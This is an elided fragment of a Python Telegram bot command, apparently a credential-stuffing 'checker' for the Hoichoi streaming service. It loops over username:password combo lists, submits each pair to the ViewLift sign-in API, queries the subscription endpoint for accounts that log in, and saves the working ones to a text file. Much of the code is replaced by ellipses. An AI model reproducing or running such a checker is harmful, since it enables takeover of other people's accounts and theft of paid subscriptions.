...
@Client.on_message(filters.command("hoi", ["/", "."]))
    ...
    try:
        ...
        with tqdm(combos, desc='Checking combos', unit='combo', ncols=80) as progress_bar:
            for combo in progress_bar:
                ...
                url = 'https://api-internal-us-east-1.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-6e99f37e-aa11-517c-404f-d9ea83111c58'
                ...
                if response.status_code == 200:
                    urls = "https://prod-api.viewlift.com/subscription/user"
...
"""
        ...
        if success_log:
            # Output success log
            success_log_text = '\n'.join(success_log)
            with open('Hoichoi_Account.txt', 'w', encoding='utf-8') as file:
